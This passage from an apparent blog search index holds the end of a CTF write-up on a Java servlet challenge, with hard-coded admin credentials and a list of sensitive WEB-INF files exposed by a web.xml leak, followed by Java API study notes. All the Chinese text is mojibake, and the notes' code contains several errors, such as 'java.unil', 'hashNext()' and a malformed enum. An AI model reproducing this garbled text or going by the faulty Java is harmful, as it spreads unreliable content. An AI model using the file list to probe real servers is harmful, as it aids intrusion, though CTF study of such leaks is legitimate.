class="string">&quot;admin&quot;</span>.equals(username) &amp;&amp; <span class="string">&quot;admin888&quot;</span>.equals(password)) &#123;</span><br><span class="line">            out.print(<span class="string">&quot;&lt;h1&gt;Flag is not here! &lt;br/&gt;&lt;img src=&#x27;images/img1.jpg&#x27;/&gt;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            System.out.println(username + <span class="string">&quot; | &quot;</span> + password);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            out.print(<span class="string">&quot;&lt;h1&gt;wrong password!&lt;/h1&gt;&lt;h3&gt;&lt;a href=\&quot;Login\&quot;&gt;Click to log in again!&lt;/a&gt;&lt;/h3&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        request.getRequestDispatcher(<span class="string">&quot;/WEB-INF/resources/index.jsp&quot;</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å“ªæœ‰ä»€ä¹ˆæ•°æ®åº“ï¼Œç™»å½•ç•Œé¢çš„è´¦å·æ˜¯<code>admin</code>ï¼Œå¯†ç æ˜¯<code>admin888</code>ï¼Œç™»è¿›å»è‚¯å®šæ²¡ä»€ä¹ˆç”¨ï¼Œä½†çœ‹ä¸€çœ‹ä¹Ÿæ— å¦¨ï¼Œè¿›å»åçš„é¡µé¢é•¿è¿™æ ·</p><p><img src="/img/post/EasyJava0.png" alt="login"></p><h3 id="WEB-INF-web-xmlæ³„éœ²"><a href="#WEB-INF-web-xmlæ³„éœ²" class="headerlink" title="WEB-INF&#x2F;web.xmlæ³„éœ²"></a>WEB-INF&#x2F;web.xmlæ³„éœ²</h3><p>WEB-INF æ˜¯Javaçš„webåº”ç”¨çš„å®‰å…¨ç›®å½•ï¼Œæ­£å¸¸æƒ…å†µä¸‹å®¢æˆ·ç«¯æ— æ³•è®¿é—®ï¼Œåªæœ‰æœåŠ¡ç«¯å¯ä»¥è®¿é—®</p><table><thead><tr><th>ç›®å½•</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>/WEB-INF/web.xml</code></td><td>Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† <code>servlet</code> å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™</td></tr><tr><td><code>/WEB-INF/classes/</code></td><td>åŒ…å«æ‰€æœ‰çš„ Servlet ç±»å’Œå…¶ä»–ç±»æ–‡ä»¶ï¼Œç±»æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ç»“æ„ä¸ä»–ä»¬çš„åŒ…åç§°åŒ¹é…</td></tr><tr><td><code>/WEB-INF/lib/</code></td><td>å­˜æ”¾ web åº”ç”¨éœ€è¦çš„å„ç§ jar æ–‡ä»¶</td></tr><tr><td><code>/WEB-INF/src/</code></td><td>æºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ª java æ–‡ä»¶</td></tr><tr><td><code>/WEB-INF/database.properties</code></td><td>æ•°æ®åº“é…ç½®æ–‡ä»¶</td></tr><tr><td><code>/WEB-INF/tags/</code></td><td>å­˜æ”¾äº†è‡ªå®šä¹‰æ ‡ç­¾æ–‡ä»¶</td></tr></tbody></table><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> php </tag>
            
            <tag> XML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaAPI</title>
      <link href="/2025/12/09/JavaAPI/"/>
      <url>/2025/12/09/JavaAPI/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaå†…ç½®API"><a href="#Javaå†…ç½®API" class="headerlink" title="Javaå†…ç½®API"></a>Javaå†…ç½®API</h1><br/><h2 id="é›†åˆæ¡†æ¶"><a href="#é›†åˆæ¡†æ¶" class="headerlink" title="é›†åˆæ¡†æ¶"></a>é›†åˆæ¡†æ¶</h2><p>é›†åˆæ¡†æ¶æ˜¯ä¸€ç§ä¿å­˜æ•°æ®çš„å®¹å™¨ï¼Œå®ƒä¸æ•°ç»„çš„åŒºåˆ«åœ¨äºé›†åˆæ¡†æ¶çš„å¤§å°å¯ä»¥åŠ¨æ€å˜åŒ–</p><p>Javaé›†åˆæ¡†æ¶æä¾›äº†ä¸€å¥—æ€§èƒ½ä¼˜è‰¯ä¸”æ–¹ä¾¿ä½¿ç”¨çš„æ¥å£å’Œç±»ï¼Œä½äº<code>java.unil</code>åŒ…ä¸­</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Collectionï¼ˆæ¥å£ï¼‰</span><br><span class="line">â”œâ”€â”€ Listï¼ˆæ¥å£ï¼‰- æœ‰åºã€å¯é‡å¤ã€æœ‰ç´¢å¼•</span><br><span class="line">â”‚   â”œâ”€â”€ ArrayListï¼ˆç±»ï¼‰- æ•°ç»„å®ç°ï¼ŒæŸ¥è¯¢å¿«ï¼Œå¢åˆ æ…¢</span><br><span class="line">â”‚   â”œâ”€â”€ LinkedListï¼ˆç±»ï¼‰- é“¾è¡¨å®ç°ï¼Œå¢åˆ å¿«ï¼ŒæŸ¥è¯¢æ…¢</span><br><span class="line">â”‚   â””â”€â”€ Vectorï¼ˆç±»ï¼‰- çº¿ç¨‹å®‰å…¨ï¼Œå·²è¿‡æ—¶</span><br><span class="line">â”‚       â””â”€â”€ Stackï¼ˆç±»ï¼‰- æ ˆç»“æ„</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ Setï¼ˆæ¥å£ï¼‰- æ— åºã€å”¯ä¸€ï¼ˆä¸é‡å¤ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ HashSetï¼ˆç±»ï¼‰- å“ˆå¸Œè¡¨å®ç°ï¼Œæ— åº</span><br><span class="line">â”‚   â”‚   â””â”€â”€ LinkedHashSetï¼ˆç±»ï¼‰- é“¾è¡¨ç»´æŠ¤æ’å…¥é¡ºåº</span><br><span class="line">â”‚   â””â”€â”€ SortedSetï¼ˆæ¥å£ï¼‰- æœ‰åºSet</span><br><span class="line">â”‚       â””â”€â”€ TreeSetï¼ˆç±»ï¼‰- çº¢é»‘æ ‘å®ç°ï¼Œè‡ªç„¶æ’åº</span><br><span class="line">â”‚</span><br><span class="line">â””â”€â”€ Queueï¼ˆæ¥å£ï¼‰- é˜Ÿåˆ—</span><br><span class="line">    â”œâ”€â”€ Dequeï¼ˆæ¥å£ï¼‰- åŒç«¯é˜Ÿåˆ—</span><br><span class="line">    â”‚   â”œâ”€â”€ ArrayDequeï¼ˆç±»ï¼‰- æ•°ç»„å®ç°åŒç«¯é˜Ÿåˆ—</span><br><span class="line">    â”‚   â””â”€â”€ LinkedListï¼ˆç±»ï¼‰- ä¹Ÿå®ç°äº†Deque</span><br><span class="line">    â”œâ”€â”€ PriorityQueueï¼ˆç±»ï¼‰- ä¼˜å…ˆçº§é˜Ÿåˆ—</span><br><span class="line">    â””â”€â”€ BlockingQueueï¼ˆæ¥å£ï¼‰- é˜»å¡é˜Ÿåˆ—ï¼ˆJUCï¼‰</span><br><span class="line">        â”œâ”€â”€ ArrayBlockingQueueï¼ˆç±»ï¼‰</span><br><span class="line">        â”œâ”€â”€ LinkedBlockingQueueï¼ˆç±»ï¼‰</span><br><span class="line">        â””â”€â”€ PriorityBlockingQueueï¼ˆç±»ï¼‰</span><br><span class="line"></span><br><span class="line">Mapï¼ˆæ¥å£ï¼‰- é”®å€¼å¯¹ï¼Œç‹¬ç«‹äºCollection</span><br><span class="line">â”œâ”€â”€ HashMapï¼ˆç±»ï¼‰- å“ˆå¸Œè¡¨å®ç°</span><br><span class="line">â”‚   â””â”€â”€ LinkedHashMapï¼ˆç±»ï¼‰- é“¾è¡¨ç»´æŠ¤æ’å…¥é¡ºåº</span><br><span class="line">â”œâ”€â”€ Hashtableï¼ˆç±»ï¼‰- çº¿ç¨‹å®‰å…¨ï¼Œå·²è¿‡æ—¶</span><br><span class="line">â”œâ”€â”€ SortedMapï¼ˆæ¥å£ï¼‰- æœ‰åºMap</span><br><span class="line">â”‚   â””â”€â”€ TreeMapï¼ˆç±»ï¼‰- çº¢é»‘æ ‘å®ç°</span><br><span class="line">â””â”€â”€ ConcurrentMapï¼ˆæ¥å£ï¼‰- å¹¶å‘Mapï¼ˆJUCï¼‰</span><br><span class="line">    â”œâ”€â”€ ConcurrentHashMapï¼ˆç±»ï¼‰</span><br><span class="line">    â””â”€â”€ ConcurrentSkipListMapï¼ˆç±»ï¼‰</span><br></pre></td></tr></table></figure><blockquote><p>Collectionæ¥å£å­˜å‚¨ä¸€ç»„ä¸å”¯ä¸€ï¼Œæ— åºçš„å¯¹è±¡</p><p>Listæ¥å£å­˜å‚¨ä¸€ç»„ä¸å”¯ä¸€ï¼Œæœ‰åºçš„å¯¹è±¡</p><p>Setæ¥å£å­˜å‚¨ä¸€ç»„å”¯ä¸€ï¼Œæ— åºçš„å¯¹è±¡</p><p>Mapæ¥å£å­˜å‚¨ä¸€ç»„é”®å€¼å¯¹è±¡ï¼Œæä¾›äº†keyåˆ°valueçš„æ˜ å°„ </p></blockquote><p>ArrayListå®ç°äº†é•¿åº¦å¯å˜çš„æ•°ç»„ï¼Œåœ¨å†…å­˜ä¸­è¿ç»­åˆ†é…ç©ºé—´ï¼Œéå†å…ƒç´ å’Œéšæœºè®¿é—®çš„æ•ˆç‡è¾ƒé«˜</p><p>LinkedListé‡‡ç”¨é“¾è¡¨çš„å­˜å‚¨æ–¹å¼ï¼Œæ’å…¥åˆ é™¤æ—¶çš„æ•ˆç‡è¾ƒé«˜</p><h3 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h3><p>æ·»åŠ æ•°æ®ï¼š<code>add(Object obj)</code></p><p>æ’å…¥æ•°æ®ï¼š<code>add(int index,Object obj)</code></p><p>åˆ é™¤æ•°æ®ï¼š<code>remove(Object obj)</code></p><p>åˆ é™¤æŒ‡å®šä½ç½®å…ƒç´ ï¼š<code>remove(int index)</code></p><p>åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŒ‡å®šå…ƒç´ ï¼š<code>contains(Object obj)</code></p><h3 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h3><blockquote><p>LinkListæä¾›å¯¹å¤´éƒ¨å’Œå°¾éƒ¨å…ƒç´ è¿›è¡Œæ“ä½œçš„æ–¹æ³•</p></blockquote><p>åœ¨åˆ—è¡¨å¤´éƒ¨æ·»åŠ å…ƒç´ ï¼š<code>addFirst(Object obj)</code></p><p>åœ¨åˆ—è¡¨æœ«å°¾æ·»åŠ å…ƒç´ ï¼š<code>addLast(Object obj)</code></p><p>è¿”å›åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼š<code>getFirst()</code></p><p>è¿”å›åˆ—è¡¨çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼š<code>getLast()</code></p><p>åˆ é™¤å¹¶è¿”å›åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼š<code>removeFirst()</code></p><p>åˆ é™¤å¹¶è¿”å›åˆ—è¡¨çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼š<code>removeLast()</code></p><h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p>å…·æœ‰Setæ¥å£çš„æ‰€æœ‰æ–¹æ³•ï¼ŒSetå­˜å‚¨çš„æ˜¯å¯¹è±¡çš„å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯å”¯ä¸€çš„å¯¹è±¡</p><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>HashMapå±äºåŒåˆ—é›†åˆï¼Œæ—¢è¦æä¾›keyä¹Ÿè¦æä¾›value </p><p>æ·»åŠ æ•°æ®ï¼š<code>put(key,value)</code></p><p>æ ¹æ®é”®è·å–å€¼ï¼š<code>get(key)</code></p><p>è·å–æ‰€æœ‰é”®çš„é›†åˆï¼š<code>keySet()</code></p><p>è·å–æ‰€æœ‰å€¼çš„é›†åˆï¼š<code>values()</code></p><p>è·å–æ‰€æœ‰é”®å€¼å¯¹çš„é›†åˆï¼š<code>entrySet()</code></p><p>æ£€æµ‹æ˜¯å¦åŒ…å«æŸä¸ªé”®ï¼š<code>containsKey(key)</code></p><h3 id="è¿­ä»£å™¨-Iterator"><a href="#è¿­ä»£å™¨-Iterator" class="headerlink" title="è¿­ä»£å™¨(Iterator)"></a>è¿­ä»£å™¨(Iterator)</h3><p>è¿­ä»£å™¨æ˜¯ä¸€ä¸ªæ¥å£</p><blockquote><p>å¦‚ä½•è·å–ä¸€ä¸ªè¿­ä»£å™¨çš„å®ç°ç±»ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼Œå¦‚é€šè¿‡<code>Iterator iterator = set.iterator</code>åˆ›å»ºä¸€ä¸ªè¿­ä»£å™¨çš„å®ç°ç±»</p></blockquote><p>æ£€æµ‹æ˜¯å¦å…·æœ‰ä¸‹ä¸€ä¸ªæ•°æ®ï¼š<code>hashNext()</code></p><p>è·å–ä¸‹ä¸€ä¸ªæ•°æ®ï¼š<code>next()</code> </p><h3 id="æ³›å‹é›†åˆ"><a href="#æ³›å‹é›†åˆ" class="headerlink" title="æ³›å‹é›†åˆ"></a>æ³›å‹é›†åˆ</h3><p>æ³›å‹é›†åˆé™åˆ¶äº†é›†åˆå…ƒç´ çš„ç±»å‹</p><p><code>List&lt;Book&gt; list = new ArrayList&lt;Book&gt;();</code>æ­¤æ—¶çš„<code>list</code>é›†åˆå†…ä¾¿åªèƒ½å­˜å‚¨<code>Book</code>ç±»å‹çš„æ•°æ®</p> <br/><h2 id="å®ç”¨ç±»"><a href="#å®ç”¨ç±»" class="headerlink" title="å®ç”¨ç±»"></a>å®ç”¨ç±»</h2><h3 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a>æšä¸¾</h3><p><code>æšä¸¾(enum)</code>æŒ‡ä¸€ç»„å›ºå®šçš„å¸¸é‡ç»„æˆçš„ç±»å‹ï¼Œå½“æŸç§ç±»å‹åªèƒ½å–å›ºå®šèŒƒå›´å†…çš„å€¼æ—¶ï¼Œå¯ä»¥å®šä¹‰ä¸ºæšä¸¾ç±»å‹ï¼Œå¦‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Weekday</span> &#123;&#125;</span><br><span class="line">    MONDAY,TUESDAY,WENESDAY,THURSDAY,FRIDAY,SATURDAY,SUNDAY</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼•ç”¨æšä¸¾ç±»å‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Weekday</span> <span class="variable">day</span> <span class="operator">=</span> Weekday.Monday;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŒ…è£…ç±»"><a href="#åŒ…è£…ç±»" class="headerlink" title="åŒ…è£…ç±»"></a>åŒ…è£…ç±»</h3><p>åŒ…è£…ç±»æŠŠåŸºæœ¬æ•°æ®ç±»å‹è½¬æ¢ä¸ºå¯¹è±¡ï¼Œå¹¶æä¾›äº†ä¸€ç³»åˆ—æ–¹æ³•</p><table><thead><tr><th>åŸºæœ¬æ•°æ®ç±»å‹</th><th>åŒ…è£…ç±»</th></tr></thead><tbody><tr><td><code>byte</code></td><td><code>Byte</code></td></tr><tr><td><code>short</code></td><td><code>Short</code></td></tr><tr><td><code>int</code></td><td><code>Integer</code></td></tr><tr><td><code>long</code></td><td><code>Long</code></td></tr><tr><td><code>float</code></td><td><code>Float</code></td></tr><tr><td><code>double</code></td><td><code>Double</code></td></tr><tr><td><code>boolean</code></td><td><code>Boolean</code></td></tr><tr><td><code>char</code></td><td><code>Character</code></td></tr></tbody></table><p>åŒ…è£…ç±»å¯ä»¥æœ‰æ„é€ ï¼Œå¹¶ä½¿ç”¨æ„é€ èµ‹å€¼ï¼ˆæ‰‹åŠ¨è£…ç®±ï¼‰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">num</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Double</span> <span class="variable">num2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Double</span>(<span class="number">1.2</span>);</span><br><span class="line"><span class="type">Character</span> <span class="variable">ch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Characer</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="type">Boolean</span> <span class="variable">bool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>åŸºæœ¬ç±»å‹å¯ä»¥è‡ªåŠ¨è½¬åŒ–ä¸ºåŒ…è£…ç±»ï¼Œå¦‚<code>Integer num = 1;</code>ï¼ˆè‡ªåŠ¨è£…ç®±ï¼‰</p><p>åŒ…è£…ç±»è½¬åŒ–ä¸ºåŸºæœ¬ç±»å‹ï¼Œç›´æ¥å–å€¼ï¼Œå¦‚<code>int num1 = num.intValue;</code>ï¼ˆæ‰‹åŠ¨æ‹†ç®±ï¼‰</p><h3 id="è£…ç®±å’Œæ‹†ç®±"><a href="#è£…ç®±å’Œæ‹†ç®±" class="headerlink" title="è£…ç®±å’Œæ‹†ç®±"></a>è£…ç®±å’Œæ‹†ç®±</h3><p>è£…ç®±ï¼šåŸºæœ¬ç±»å‹è½¬åŒ–ä¸ºåŒ…è£…ç±»å‹å¯¹è±¡</p><p>æ‹†ç®±ï¼šåŒ…è£…ç±»å‹å¯¹è±¡è½¬åŒ–ä¸ºåŸºæœ¬ç±»å‹çš„å€¼</p><blockquote><p>è‡ªåŠ¨æ‹†ç®±çš„ä¾‹å­<code>int num1 = num;</code>è¿™é‡Œçš„<code>num</code>æ˜¯ä¸€ä¸ª<code>Integer</code>åŒ…è£…ç±»çš„å¯¹è±¡</p></blockquote><blockquote><p>è£…ç®±æ“ä½œå­˜åœ¨çš„å¿…è¦æ€§ï¼šæ³›å‹é›†åˆä¸­ä¸èƒ½å®¹çº³åŸºæœ¬ç±»å‹æ•°æ®</p></blockquote><h3 id="Mathç±»"><a href="#Mathç±»" class="headerlink" title="Mathç±»"></a><code>Math</code>ç±»</h3><p><code>Math.abs()</code>ç”¨äºè·å¾—ç»å¯¹å€¼</p><p><code>Math.max()</code>ç”¨äºæ±‚æœ€å¤§å€¼</p><p><code>Math.pow()</code>ç”¨äºè¿›è¡Œæ¬¡æ–¹è¿ç®—</p><p><code>Math.sqrtI()</code>ç”¨äºè¿›è¡Œå¼€æ–¹è¿ç®—</p><blockquote><p>è¿™äº›æ–¹æ³•éƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œä¸éœ€è¦å¯¹<code>Math</code>ç±»è¿›è¡Œå®ä¾‹åŒ–  </p></blockquote><h3 id="Stringå’ŒStringBuffer"><a href="#Stringå’ŒStringBuffer" class="headerlink" title="Stringå’ŒStringBuffer"></a><code>String</code>å’Œ<code>StringBuffer</code></h3><h4 id="String"><a href="#String" class="headerlink" title="String"></a>String</h4><p>å¸¸ç”¨æ–¹æ³•</p><table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>length()</code></td><td>è·å–å­—ç¬¦ä¸²é•¿åº¦</td></tr><tr><td><code>equals(Object boj)</code></td><td>æ¯”è¾ƒå­—ç¬¦ä¸²å†…å®¹æ˜¯å¦ä¸€è‡´</td></tr><tr><td><code>equalsIgnoreCase(String str)</code></td><td>å¿½ç•¥å¤§å°å†™å¯¹æ¯”</td></tr><tr><td><code>toLowerCase()</code></td><td>è½¬å°å†™</td></tr><tr><td><code>toUpperCase()</code></td><td>è½¬å¤§å†™</td></tr><tr><td><code>concat(String str)</code></td><td>è¿æ¥å­—ç¬¦ä¸²</td></tr><tr><td><code>indexOf(String value)</code></td><td>æœç´¢ç¬¬ä¸€ä¸ªå‡ºç°çš„å­—ç¬¦ä¸²<code>value</code>ï¼Œæœ‰åˆ™è¿”å›ç´¢å¼•ï¼Œæ²¡æœ‰æ‰¾åˆ°åˆ™è¿”å›<code>-1</code></td></tr><tr><td><code>lastIndexOf(String value)</code></td><td>æœç´¢æœ€åä¸€ä¸ªå‡ºç°çš„å­—ç¬¦ä¸²<code>value</code>ï¼Œæœ‰åˆ™è¿”å›ç´¢å¼•ï¼Œæ²¡æœ‰æ‰¾åˆ°åˆ™è¿”å›<code>-1</code></td></tr><tr><td><code>substring(int index)</code></td><td>æå–ä»ä½ç½®ç´¢å¼•å¼€å§‹çš„å­—ç¬¦ä¸²éƒ¨åˆ†</td></tr><tr><td><code>substring(int beginindex,int endindex)</code></td><td>æå–<code>beginindex</code>å’Œ<code>endindex</code>ä¹‹é—´çš„å­—ç¬¦ä¸²éƒ¨åˆ†</td></tr><tr><td><code>trim()</code></td><td>è¿”å›ä¸€ä¸ªå‰åä¸å«ä»»ä½•ç©ºæ ¼çš„è°ƒç”¨å­—ç¬¦ä¸²çš„å‰¯æœ¬</td></tr><tr><td><code>replace(char oldChar,char newChar)</code></td><td>å°†<code>oldChar</code>æ›¿æ¢ä¸º<code>newChar</code></td></tr><tr><td><code>replace(CharSequence target,CharSequence replacement)</code></td><td>å°†<code>target</code>æ›¿æ¢ä¸º<code>replacement</code></td></tr><tr><td><code>split(String regex)</code></td><td>å°†ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²ä¸ºå­å­—ç¬¦å¤„å¥³ï¼Œç»“æœä½œä¸ºå­—ç¬¦ä¸²æ•°ç»„è¿”å›</td></tr></tbody></table><h4 id="StringBuffer"><a href="#StringBuffer" class="headerlink" title="StringBuffer"></a>StringBuffer</h4><p><code>StringBuffer</code>æ˜¯å¯å˜å­—ç¬¦ä¸²ã€‚éœ€è¦å¯¹å­—ç¬¦ä¸²è¿›è¡Œå¤§é‡æ‹¼æ¥æ—¶ï¼Œä½¿ç”¨<code>StringBuffer</code>ç±»å¯ä»¥æé«˜æ‰§è¡Œæ•ˆç‡</p><p>å¸¸ç”¨æ–¹æ³•</p><table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>append(Striing str)</code></td><td>è¿½åŠ å­—ç¬¦ä¸²</td></tr><tr><td><code>insert(int index)</code></td><td>æ’å…¥å­—ç¬¦ä¸²</td></tr></tbody></table><blockquote><p>è¾“å‡º<code>StringBuffer</code>éœ€è¦å…ˆä½¿ç”¨<code>toString</code>æ–¹æ³•è½¬æ¢</p></blockquote><h3 id="éšæœºæ•°"><a href="#éšæœºæ•°" class="headerlink" title="éšæœºæ•°"></a>éšæœºæ•°</h3><p>ä½¿ç”¨<code>Random</code>ç±»å¯ä»¥ç”Ÿä¼ªéšæœºæ•°ï¼Œä½äº<code>java.util</code>åŒ…ä¸‹</p><p>ä½¿ç”¨<code>Random random = new Random();</code>å®ä¾‹åŒ–<code>Random</code>ç±»ï¼Œå¯ä»¥åœ¨æ„é€ æ–¹æ³•ä¸­ä¼ å…¥ä»»æ„æ•°å­—ä½œä¸º<code>seed</code></p><h3 id="è·å–æ—¥æœŸå’Œæ—¶é—´"><a href="#è·å–æ—¥æœŸå’Œæ—¶é—´" class="headerlink" title="è·å–æ—¥æœŸå’Œæ—¶é—´"></a>è·å–æ—¥æœŸå’Œæ—¶é—´</h3><p>ä½¿ç”¨<code>Date</code>ç±»è·å¾—æœ‰å…³æ—¶é—´çš„æ•°æ®ï¼Œä½äº<code>java.util</code>åŒ…ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>;</span><br><span class="line"><span class="comment">//è®¾ç½®è¾“å‡ºæ ¼å¼</span></span><br><span class="line"><span class="type">SimpleDateFormate</span> <span class="variable">formater</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormate</span>(<span class="string">&quot;yyyy-MM-dd&quot;</span>)</span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> formater.format(date);</span><br><span class="line">System.out.println(result);</span><br><span class="line">System.out.println(date.toString());</span><br></pre></td></tr></table></figure>  <br/><h2 id="IOæµ"><a href="#IOæµ" class="headerlink" title="IOæµ"></a>IOæµ</h2><h3 id="Fileç±»è®¿é—®æ–‡ä»¶åŠç›®å½•"><a href="#Fileç±»è®¿é—®æ–‡ä»¶åŠç›®å½•" class="headerlink" title="Fileç±»è®¿é—®æ–‡ä»¶åŠç›®å½•"></a>Fileç±»è®¿é—®æ–‡ä»¶åŠç›®å½•</h3><p>ä½¿ç”¨<code>java.io.file</code>åŒ…ä¸‹çš„<code>File</code>ç±»</p><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left"><code>boolean exists()</code></td><td align="left">åˆ¤æ–­æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨</td></tr><tr><td align="left"><code>boolean isFile()</code></td><td align="left">åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶</td></tr><tr><td align="left"><code>boolean isDirectory()</code></td><td align="left">åˆ¤æ–­æ˜¯å¦æ˜¯ç›®å½•</td></tr><tr><td align="left"><code>String getPath()</code></td><td align="left">è¿”å›æ­¤å¯¹è±¡è¡¨ç¤ºçš„æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„å</td></tr><tr><td align="left"><code>String getAbsolutePath()</code></td><td align="left">è¿”å›æ­¤å¯¹è±¡è¡¨ç¤ºçš„æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å</td></tr><tr><td align="left"><code>String getName()</code></td><td align="left">è¿”å›æ­¤å¯¹è±¡è¡¨ç¤ºçš„æ–‡ä»¶æˆ–ç›®å½•çš„åç§°</td></tr><tr><td align="left"><code>boolean delete()</code></td><td align="left">åˆ é™¤æ­¤å¯¹è±¡æŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•</td></tr><tr><td align="left"><code>boolean createNewFile()</code></td><td align="left">åˆ›å»ºåç§°çš„ç©ºæ–‡ä»¶ï¼Œä¸åˆ›å»ºæ–‡ä»¶å¤¹</td></tr><tr><td align="left"><code>long length()</code></td><td align="left">è¿”å›æ–‡ä»¶çš„é•¿åº¦ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›0L</td></tr></tbody></table><h3 id="å­—èŠ‚æµ"><a href="#å­—èŠ‚æµ" class="headerlink" title="å­—èŠ‚æµ"></a>å­—èŠ‚æµ</h3><p> <code>FileInputStream</code>,ç»§æ‰¿äº<code>InputStream</code></p><p><code>int read()</code>è¿”å›ä¸‹ä¸€ä¸ªå­—èŠ‚<br><code>int read(byte[] b)</code>è¿”å›ç¼“å†²åŒºæ•°æ®æ€»é‡<br><code>int read(byte[] b,int off,int len)</code>ä»è¾“å…¥æµä¸­è¯»å–æœ€å¤š len ä¸ªå­—èŠ‚çš„æ•°æ®åˆ°å­—èŠ‚æ•°ç»„ b ä¸­ï¼Œä»æ•°ç»„çš„åç§»ä½ç½® off å¼€å§‹å­˜å‚¨<br><code>void close()</code>å…³é—­æµ<br><code>int available()</code> å¯ä»¥ä»è¾“å…¥æµä¸­è¯»å–çš„å­—èŠ‚æ•°ç›®</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleFileReader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. åˆ›å»ºæ–‡ä»¶è¾“å…¥æµ</span></span><br><span class="line">            fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. é€ä¸ªå­—èŠ‚è¯»å–å¹¶æ˜¾ç¤º</span></span><br><span class="line">            <span class="type">int</span> byteData;</span><br><span class="line">            System.out.println(<span class="string">&quot;æ–‡ä»¶å†…å®¹ï¼ˆå­—èŠ‚å½¢å¼ï¼‰ï¼š&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> ((byteData = fis.read()) != -<span class="number">1</span>) &#123;</span><br><span 